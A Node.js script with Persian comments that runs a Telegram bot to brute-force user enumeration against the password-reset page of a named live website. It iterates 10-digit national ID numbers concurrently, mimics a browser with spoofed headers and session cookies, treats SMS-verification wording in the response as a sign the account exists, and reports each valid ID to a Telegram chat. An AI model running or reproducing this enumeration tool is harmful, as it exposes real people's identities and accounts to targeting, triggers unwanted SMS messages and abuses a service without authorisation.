import dotenv from "dotenv";
import TelegramBot from "node-telegram-bot-api";
import { JSDOM } from "jsdom";
import express from "express";

dotenv.config();

const TOKEN = process.env.TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const START = Number(process.env.START ?? 0);
const END = Number(process.env.END ?? 1000);
const CONCURRENT = Number(process.env.CONCURRENT) || 10;

const bot = new TelegramBot(TOKEN, { polling: true });

console.log("Bot script started");
console.log(`Range: ${START} → ${END} | Concurrent: ${CONCURRENT}`);
if (!TOKEN || !CHAT_ID) {
  console.error("⚠️ TOKEN یا CHAT_ID در .env تنظیم نشده است");
}

bot.on("polling_error", (err) => {
  console.error("Polling error:", err?.message || err);
});

// ===============================
// تابع چک کردن کاربر
// ===============================
async function checkUserExists(nationalNo) {
  const url = "https://haftometir.modabberonline.com/ForgetPassword.aspx";

  try {
    // مرحله اول: GET مثل مرورگر
    const pageRes = await fetch(url, {
      method: "GET",
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cache-Control": "no-cache",
        Pragma: "no-cache",
      },
    });

    const pageHtml = await pageRes.text();

    // برداشت کوکی‌ها برای POST بعدی
    const setCookie = pageRes.headers.get("set-cookie");
    const cookieHeader = setCookie
      ? setCookie
          .split(",")
          .map((c) => c.split(";")[0].trim())
          .join("; ")
      : undefined;

    // پارس HTML شبیه DOMParser
    const dom = new JSDOM(pageHtml);
    const doc = dom.window.document;

    const formData = new URLSearchParams();
    doc.querySelectorAll('input[type="hidden"]').forEach((input) => {
      if (input.name) {
        formData.append(input.name, input.value || "");
      }
    });

    formData.append("Radio1", "rbPersonal");
    formData.append("txtNationalNo", nationalNo);
    formData.append("ddlYears", "51");
    formData.append("btnGetMobileNumber", "ارسال");

    // مرحله دوم: POST با هدرهای شبیه مرورگر + کوکی
    const headers = {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
      "Accept-Language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
      Origin: "https://haftometir.modabberonline.com",
      Referer: "https://haftometir.modabberonline.com/ForgetPassword.aspx",
      Connection: "keep-alive",
    };

    if (cookieHeader) {
      headers["Cookie"] = cookieHeader;
    }

    const response = await fetch(url, {
      method: "POST",
      headers,
      body: formData,
    });

    const resHtml = await response.text();

    const exists =
      resHtml.includes("کد تایید") ||
      resHtml.includes("پیامک") ||
      resHtml.includes("موبایل") ||
      resHtml.includes("txtVerifyCode") ||
      resHtml.includes("pnlVerifyCode");

    return { nationalNo, exists };
  } catch (err) {
    return { nationalNo, exists: null, error: err.message };
  }
}

// ===============================
// پردازش دسته‌ای
// ===============================
async function processBatch(nationalNumbers) {
  const promises = nationalNumbers.map((no) => checkUserExists(no));
  return Promise.allSettled(promises);
}

// ===============================
// تابع اصلی Brute Force
// ===============================
async function bruteForceAll(start, end, concurrent = 10) {
  console.log(`⚡ Test شروع شد (${concurrent} درخواست همزمان)`);

  bot.sendMessage(
    CHAT_ID,
    `🚀 عملیات Test شروع شد!\n⚡ همزمانی: ${concurrent}`
  );

  let count = 0;
  let foundCount = 0;
  const startTime = Date.now();

  for (let i = start; i <= end; i += concurrent) {
    const batch = [];
    for (let j = 0; j < concurrent && i + j <= end; j++) {
      batch.push((i + j).toString().padStart(10, "0"));
    }

    const results = await processBatch(batch);

    for (const result of results) {
      if (result.status === "fulfilled") {
        const { nationalNo, exists, error } = result.value;

        if (exists) {
          foundCount++;
          const msg = `🎯 کاربر پیدا شد:\n<code>${nationalNo}</code>`;
          console.log(msg);
          bot.sendMessage(CHAT_ID, msg, { parse_mode: "HTML" });
        }

        if (error) {
          console.log(`❌ خطا برای ${nationalNo}: ${error}`);
        }
      }

      count++;
    }

    // 🔵 هر 50 تا → فقط لاگ کنسول
    if (count > 0 && count % 50 === 0) {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
      const speed = (count / elapsed).toFixed(1);

      console.log(
        `📘 [LOG] تست شده: ${count} | پیدا شده: ${foundCount} | سرعت: ${speed}/ثانیه | آخرین: ${
          batch[batch.length - 1]
        }`
      );
    }

    // 🟡 هر 1000 تا → پیام تلگرام
    if (count > 0 && count % 1000 === 0) {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
      const speed = (count / elapsed).toFixed(1);

      const status =
        `⏳ وضعیت کار:\n` +
        `تست شده: ${count}\n` +
        `پیدا شده: ${foundCount}\n` +
        `⚡ سرعت: ${speed}/ثانیه\n` +
        `🔚 آخرین: <code>${batch[batch.length - 1]}</code>`;

      bot.sendMessage(CHAT_ID, status, { parse_mode: "HTML" });
    }
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
  const finalMsg =
    `🔥 عملیات پایان یافت!\n` +
    `✅ تست شده: ${count}\n` +
    `🎯 پیدا شده: ${foundCount}\n` +
    `⏱ زمان: ${totalTime} ثانیه`;

  bot.sendMessage(CHAT_ID, finalMsg);
  console.log(finalMsg);
}

// ===============================
// تاخیر (اختیاری)
// ===============================
const delay = (ms) => new Promise((r) => setTimeout(r, ms));

// ===============================
// دستور start
// ===============================
bot.onText(/\/start/, () => {
  bot.sendMessage(
    CHAT_ID,
    `⚡ ربات فعال شد!\n📊 محدوده: ${START} → ${END}\n🔄 همزمانی: ${CONCURRENT}`
  );
  bruteForceAll(START, END, CONCURRENT);
});

// تنظیم مقدار همزمانی
bot.onText(/\/concurrent (\d+)/, (msg, match) => {
  const newConcurrent = parseInt(match[1]);
  bot.sendMessage(CHAT_ID, `⚡ همزمانی تنظیم شد: ${newConcurrent}`);
});

// ===============================
// Express Server
// ===============================
const app = express();
const PORT = process.env.PORT || 3000;

app.get("/", (req, res) => {
  res.send("Bot is running");
});

app.listen(PORT, () => {
  console.log(`Express server running on port ${PORT}`);
});

bruteForceAll(START, END, CONCURRENT).catch((err) => {
  console.error("bruteForceAll error:", err?.message || err);
});
